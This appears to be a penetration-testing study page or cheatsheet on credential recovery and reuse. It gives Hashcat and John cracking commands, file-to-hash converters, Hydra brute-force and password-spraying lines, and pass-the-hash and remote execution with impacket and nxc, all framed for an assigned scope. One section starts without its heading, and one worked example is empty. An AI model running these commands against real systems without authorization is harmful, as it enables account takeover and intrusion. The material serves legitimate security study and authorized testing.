Recover and use authentication material

Strategy map | Master Notes | Operational index | Cheatsheets

Treat passwords, keys, stored verifiers, challenge responses and tickets as different capabilities. Recovering a password, authenticating and obtaining useful authorization are separate transitions.

Speedrun blocks: 5; recurring identity thread. Documented methods: 10.

Examples are hypothetical study material. Apply commands only to an assigned scope during the later practice phase. A method is enabled by its prerequisites; its presence here does not establish a vulnerability or practical mastery.

First pass: tools and findings

Use the branch matching the current host, identity and observed result. Tool output supplies leads; the linked procedure verifies and uses the exact condition.

Identify the artifact before using a cracking tool

Keep provenance and local/domain/application account scope. Hash-looking text is not automatically an NT hash.

file FILE
head -c 160 FILE
  • If A plaintext password: Test the matching identity on one relevant reachable service. → Validate known passwords and context-specific reuse.
  • If An SSH private key: Check key format, protection and the intended account. → Inspect and recover SSH private-key access.
  • If A ticket/cache: Check principal, service scope, expiry and a compatible client. → Classify tickets and use a compatible cache.
  • Otherwise: Format is still unknown: inspect the artifact before selecting a Hashcat/John mode. → Classify the artifact and its identity context.

Use Hashcat/John only after format identification

Select the documented format-specific mode and an offline candidate list; recovery is not proof of service access.

hashcat -a 0 -m MODE hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule --session job
hashcat -m MODE hashes.txt --show
  • If A password is recovered: Validate the account scope and relevant service permission. → Validate known passwords and context-specific reuse.
  • If A reusable NT hash rather than a recoverable plaintext password: Use only protocols and clients supporting that material. → Recover or reuse an NT password hash.
  • Otherwise: No recovery: revisit artifact type and feasible candidates; enumerate other evidence instead of assuming the account is unusable. → Classify the artifact and its identity context.

Discovery workflow

Start with an artifact produced by an actual read, query, session or collection source; the artifact type and username may still be unknown.

Follow these observations into a method; the detailed recognition routes below show synthetic output and the checks still needed.

  1. Record source and account scope, then inspect the artifact's structure: Classify the artifact and its identity context.
  2. Separate an immediately usable password/key from material needing recovery: Validate known passwords and context-specific reuse; Inspect and recover SSH private-key access; Recover passwords with feasible dictionary, rule and mask attacks.
  3. Use type-specific handling for stored verifiers, captured responses and tickets: Recover or reuse an NT password hash; Recover a password from a captured NTLM response; Recover a password from cached domain logon verifiers; Classify tickets and use a compatible cache.
  4. After acceptance, test the specific service right and return to authenticated enumeration: Match route, destination service and effective authorization; Enumerate SMB/RPC shares, files and identities.

Decision rule: an observed clue opens a candidate. Choose it only after the missing conditions are verified; a failed check rules out that context, while unavailable evidence stays inconclusive.

Method families

  • Classification and online use: Classify the artifact and its identity context, Validate known passwords and context-specific reuse.
  • Offline recovery and protected files: Recover passwords with feasible dictionary, rule and mask attacks, Recover a protected KeePass database password, Inspect and recover SSH private-key access, Recover Linux account passwords from matched records.
  • Typed Windows/domain material: Recover or reuse an NT password hash, Recover a password from a captured NTLM response, Recover a password from cached domain logon verifiers, Classify tickets and use a compatible cache.

Classify the artifact and its identity context

Blocks: 5; recurring identity thread. Operational procedure | Operational procedure | Operational procedure | Quick sheet

1. Purpose and result

A typed credential record with a justified use or recovery path.

2. Recognition clues

A secret-like value, key file, stored hash, challenge response or ticket.

Find the clue from your starting access

Where to investigate: Return to the file, database row, capture or session that produced the artifact; inspect structure and account labels before choosing a tool mode.

Discovery action — reference example:

Recognize this detail: Headers and producing context distinguish a private key, challenge response and stored NT verifier.

3. Prerequisites

Starting access: A credential artifact with a recorded source and possible account context. Required conditions: Artifact provenance and format; possible local/domain/application identity and compatible protocol.

5. Why it works

An NT hash, Net-NTLMv2 response and DCC2 verifier are not interchangeable. Source and format constrain cracking mode, reuse protocol and expected rights.

Validate known passwords and context-specific reuse

Blocks: 5; recurring identity thread. Operational procedure | Operational procedure | Operational procedure | Quick sheet

1. Purpose and result

A verified authentication result followed by tested service-specific authorization.

2. Recognition clues

A password tied to a plausible user and service.

Find the clue from your starting access

Where to investigate: Use the account label from the producing source and the observed service inventory to choose one compatible, correctly qualified validation.

Discovery action — reference example:

nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD'

Illustrative evidence — synthetic, abbreviated:

The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.

SMB TARGET [+] DOMAIN\USER: accepted
Administrative execution: not yet demonstrated

Recognize this detail: Accepted authentication proves one service/account pairing; it does not establish shares, administration, RDP or WinRM.

Still missing before method selection: Qualify local/domain/application identity explicitly, test a compatible reachable service and record the accepted identity. Then test the specific share/logon/execution right; successful authentication is not administrative authorization.

Outcome after checkingExample and next decision
Enabled after validationThe intended service operation succeeds under the recorded identity: use that access and re-enumerate.
Ruled out in this contextThe secret is valid only for the application and not the proposed OS account: reject that reuse pairing.
InconclusiveA generic logon failure may hide account/domain/state mismatch; classify it before repeating attempts.

If you do not yet have this clue: start with Classify the artifact and its identity context.

3. Prerequisites

Starting access: A credential artifact with a recorded source and possible account context. Required conditions: Correct local/domain/application identity, reachable compatible service, accepted authentication and account state.

4. Discover and verify prerequisites

nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD'
ssh -p PORT USER@TARGET

5. Why it works

One password may belong to several independently managed identities. Authentication success is useful only when associated with a precise service and allowed action.

6. Execute and choose variants

Use the normal client for the observed service:

ssh -o PreferredAuthentications=password -p PORT USER@TARGET
nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares
evil-winrm -i TARGET -u USER -p 'PASSWORD'
xfreerdp /v:TARGET /u:'DOMAIN\USER' /p:'PASSWORD' /cert:ignore

Local Windows account:

nxc smb TARGET --local-auth -u USER -p 'PASSWORD' --shares

Decisive output: the destination service accepts the intended identity. Share, session or action access is a separate authorization result.

Variant — known user, targeted password dictionary 
hydra -l USER -P WORDLIST -s PORT -t 4 -f ssh://TARGET
hydra -l USER -P WORDLIST -t 1 -f rdp://TARGET

Use only on an assigned target after checking lockout and rate controls. Confirm every reported success with the normal client.

Variant — one password across an authorized user list 
hydra -L USERS -p 'PASSWORD' -s PORT -t 1 rdp://TARGET
nxc smb TARGET -d DOMAIN -u USERS -p 'PASSWORD' --continue-on-success

One attempt per account can still trigger lockout or monitoring. Establish scope, threshold/window and observation period first.

Variant — HTTP POST form

Capture a correct request and stable failure marker with Burp:

hydra -l USER -P WORDLIST TARGET http-post-form \
  '/LOGIN_PATH:username=^USER^&password=^PASS^:F=STABLE_FAILURE_TEXT'

Dynamic CSRF tokens, cookies, redirects, throttling and uniform responses require manual handling or a different approach. A weak failure marker creates false positives.

RunasCs — test a known password from an existing Windows shell

Use a reviewed, compatible build on the current Windows host with a known plaintext password. This creates a new local process/logon context; it is not remote execution and does not turn an NT hash into a password.

REM Domain account: verify the new process token
RunasCs.exe USER PASSWORD "cmd /c whoami /all" -d DOMAIN

REM Local account: omit the domain switch for the current host's account
RunasCs.exe USER PASSWORD "cmd /c whoami /all"

REM Network-only credentials: local identity stays unchanged
RunasCs.exe USER PASSWORD "cmd /c dir \\TARGET\SHARE" -d DOMAIN -l 9

Read: in the first two forms, whoami identifies the created process; inspect its groups/integrity before claiming escalation. With logon type 9, local whoami is not a credential test: use the remote operation's result. Logon failure → check account scope, password and permitted logon type. An accepted logon with access denied → inspect authorization on that resource.

RunasCs upstream. Native runas remains an alternative when an interactive password prompt is usable. Neither tool guarantees an elevated token.

accepted identity -> groups/roles -> reachable services -> shares/files
-> authenticated application behavior -> accessible hosts/routes
-> new credentials/tickets/sessions -> privilege and movement handoffs

Verify destination host, accepted identity and actual read/write/execute rights. New hosts/listeners return to discovery; recovered material returns here; operating-system execution enters session handling; domain identities enter AD mapping.

net accounts /domain

Get-DomainPolicyData | Select-Object -ExpandProperty SystemAccess

Password validation belongs to the existing credential procedure. Do not spray by default. If explicitly required, account for lockout threshold, duration, observation window and prior failures; use one justified candidate, stop on lockout/rate-limit evidence and preserve successful identities separately.

7. Worked example — hypothetical

Observation: a configuration contains a username/password. Test: validate the source application first, then an evidence-backed OS/domain reuse. Illustrative output: SMB authenticates but no administrative access exists. Interpretation: enumerate readable shares rather than assume execution.

8. Verify the result

Record exact identity, service and tested read/write/session effect; classify authentication and authorization separately.

9. Failure and fallback

Account disabled, expired password, wrong domain and denied logon require different responses. Avoid repeating a known-valid password against a denied action.

10. Next transitions

Enumerate SMB/RPC shares, files and identities; Match route, destination service and effective authorization; Use SSH passwords, keys and forwarding-capable access.

Recover passwords with feasible dictionary, rule and mask attacks

Blocks: 5; recurring identity thread. Operational procedure | Operational procedure | Operational procedure | Quick sheet

1. Purpose and result

A recovered candidate password or a documented exhausted search strategy.

2. Recognition clues

A supported stored verifier or converted protected artifact.

Find the clue from your starting access

Where to investigate: Identify a supported verifier/converter and build candidate structure from relevant names/policy/context rather than selecting an arbitrary hash mode.

Discovery action — reference example:

hashcat --example-hashes
john --list=formats

Illustrative evidence — synthetic, abbreviated:

The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.

Artifact format matches SUPPORTED_MODE
Candidate model: relevant words plus a justified suffix pattern

Recognize this detail: A verified format and feasible candidate model enable offline recovery; a hash-shaped string alone does not.

Still missing before method selection: Check complete salt/context, conversion correctness, tool backend and whether all required factors are present.

Outcome after checkingExample and next decision
Enabled after validationThe verifier and candidate space are valid: use the selected offline strategy and verify recovered credentials.
Ruled out in this contextThe artifact is a non-crackable token or unsupported format under this workflow: reject that mode.
InconclusiveParsing errors or an incomplete source require input repair; no recovery only exhausts the tested candidates.

If you do not yet have this clue: start with Classify the artifact and its identity context.

3. Prerequisites

Starting access: A credential artifact with a recorded source and possible account context. Required conditions: Correct format/mode, complete salt/context, justified candidates and an available offline tool/backend.

4. Discover and verify prerequisites

hashcat --example-hashes
john --list=formats

5. Why it works

Offline cracking compares candidate-derived values without contacting the service. Dictionary rules and masks model likely structure; infeasible keyspaces do not become useful through a different tool name.

6. Execute and choose variants

hashcat -b -m MODE
python3 -c "print((CHARSET_SIZE ** LENGTH) / GUESSES_PER_SECOND)"

Use the actual mode and hardware rate. Salts prevent reusable precomputation; iterations and memory-hard KDFs reduce guesses per second. Prefer candidates in this order:

exact recovered/default candidates -> organization/user/product words
-> observed policy and mutations -> small dictionary plus rules
-> known mask/hybrid -> broader curated lists/rules
-> exhaustive search only when its measured cost is defensible

Preview mutations before spending the candidate budget:

hashcat -r /usr/share/hashcat/rules/best64.rule --stdout wordlist.txt | head -n 50
john --wordlist=wordlist.txt --rules=Jumbo --stdout | head -n 50

hashcat -a 0 -m MODE hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule --session job
hashcat -m MODE hashes.txt --show

-a 0 is dictionary mode. Do not use -a 3 with a wordlist; attack mode 3 expects a mask.

Common source examples identify NTLM as mode 1000, Net-NTLMv2 as 5600 and KeePass as 13400, but confirm against the installed version:

hashcat -h | grep -Ei 'NTLM|NetNTLMv2|KeePass|OpenSSH'
Mask and session variants 
hashcat -m MODE hashes.txt -a 3 '?u?l?l?l?l?d?d?d' --session targeted-mask
hashcat --session targeted-mask --restore

Mask order is a hypothesis about structure. Estimate its keyspace before committing time.

Hybrid variant — base word plus three digits 
hashcat -a 6 -m MODE hashes.txt wordlist.txt '?d?d?d' --session targeted-hybrid

Use only when evidence supports both the base words and suffix shape.

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt

john --format=FORMAT --wordlist=wordlist.txt --rules=Jumbo hash.txt
john --session=crack-job --wordlist=wordlist.txt hash.txt
john --restore=crack-job

File-to-hash converters:

zip2john archive.zip > archive.hash
7z2john archive.7z > archive.hash
ssh2john id_rsa > ssh.hash
keepass2john vault.kdbx > keepass.hash
pdf2john document.pdf > pdf.hash
office2john document.docx > office.hash
rar2john archive.rar > rar.hash
unshadow passwd.copy shadow.copy > linux.hash

Converter availability varies by package/path; locate it rather than assuming:

command -v ssh2john || find /usr/share/john -maxdepth 2 -iname '*2john*' 2>/dev/null

Preserve the complete converter output. Some formats include a filename label before : that John accepts but Hashcat may require removed from a separate tool-specific copy.

7. Worked example — hypothetical

8. Verify the result

Use the tool's show/result output and then validate the recovered credential in its correct context.

9. Failure and fallback

Token/separator errors imply wrong or incomplete input; no recovery means only the tested candidate space was exhausted.

4. Discover and verify prerequisites

chmod 600 KEY
ssh-keygen -y -f KEY

5. Why it works

A private-key passphrase protects the file locally; it is not the remote account password. Server acceptance still depends on user, authorized key, ownership and SSH policy.

6. Execute and choose variants

ssh2john id_rsa > ssh.hash

Choose MODE from the complete $sshng$... structure and installed help. Token-length or unsupported-cipher errors require a compatible parser/tool, not --force with a wrong mode.

Verify the key parses and an SSH authentication/session succeeds under the correct target identity.

9. Failure and fallback

Invalid format, line endings, wrong passphrase and server rejection are separate layers.

Recover or reuse an NT password hash

Blocks: 5; recurring identity thread. Operational procedure | Quick sheet

1. Purpose and result

A recovered password or a verified hash-backed authentication capability.

2. Recognition clues

An NT verifier from an appropriate credential source.

Find the clue from your starting access

Where to investigate: Inspect the output schema of a justified local/domain credential source, keeping RID, machine and domain labels.

Discovery action — reference example:

head -n 3 hashes.txt

Illustrative evidence — synthetic, abbreviated:

The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.

USER:RID:LM_HASH:NT_HASH:::
Source: matched local registry extraction

Recognize this detail: The source and record fields identify an NT verifier for that local account, not a captured challenge response.

Still missing before method selection: Verify the actual NT field, account scope and an accepting service/client with the required destination right.

Outcome after checkingExample and next decision
Enabled after validationA compatible service accepts the correctly qualified hash identity: use only its verified authorization.
Ruled out in this contextThe source produced Net-NTLMv2 or DCC2 instead: reject direct NT-hash reuse.
InconclusiveAn unlabeled hexadecimal value remains unknown until the source/account is resolved.

If you do not yet have this clue: start with Extract local account hashes from matched SAM and SYSTEM.

3. Prerequisites

Starting access: A credential artifact with a recorded source and possible account context. Required conditions: Correct account/domain and actual NT hash; recovery mode or an accepting NTLM service with required destination rights.

4. Discover and verify prerequisites

hashcat -m 1000 hashes.txt WORDLIST
nxc smb TARGET -d DOMAIN -u USER -H HASH

5. Why it works

Pass-the-Hash uses a long-term NT key in an NTLM exchange; it does not convert every captured hash-like value into a reusable password equivalent.

6. Execute and choose variants

Offline recovery:

hashcat -a 0 -m 1000 nt.hash wordlist.txt -r /usr/share/hashcat/rules/best64.rule
john --format=NT --wordlist=wordlist.txt nt.hash

Compatible SMB validation:

nxc smb TARGET -d DOMAIN -u USER -H NT_HASH --shares
smbclient //TARGET/SHARE -U 'DOMAIN\USER' --pw-nt-hash NT_HASH

NT hashes come from a producing context such as SAM, LSASS or NTDS. A visually similar 32-hex application digest is not PtH material.

Variant — remote access/execution when the identity has matching rights 
impacket-wmiexec -hashes :NT_HASH 'DOMAIN/USER@TARGET'
impacket-psexec -hashes :NT_HASH 'DOMAIN/USER@TARGET'
xfreerdp /v:TARGET /u:'DOMAIN\USER' /pth:NT_HASH /cert:ignore

WMI needs administrative rights plus DCOM/RPC/SMB reachability and normally runs as the authenticated user. PsExec-style execution needs service-control and writable-share rights and commonly yields SYSTEM. RDP hash authentication depends on target/client support and policy. Detailed method selection belongs to the lateral-movement procedure.

7. Worked example — hypothetical

Observation: a matched SAM/SYSTEM extraction yields a local NT hash. Test: qualify the target-local identity for one reachable service. Illustrative output: authentication succeeds but execution is denied. Interpretation: record valid authentication and investigate effective rights.

8. Verify the result

Verify source/type, identity context and the exact permitted service action.

9. Failure and fallback

Local/domain confusion, remote UAC and denied NTLM are different from an invalid hash. Use tickets only when their own prerequisites exist.

10. Next transitions

Select password, NT hash, key-to-ticket or ticket authentication; Validate known passwords and context-specific reuse; Execute through uploaded service creation using PsExec.
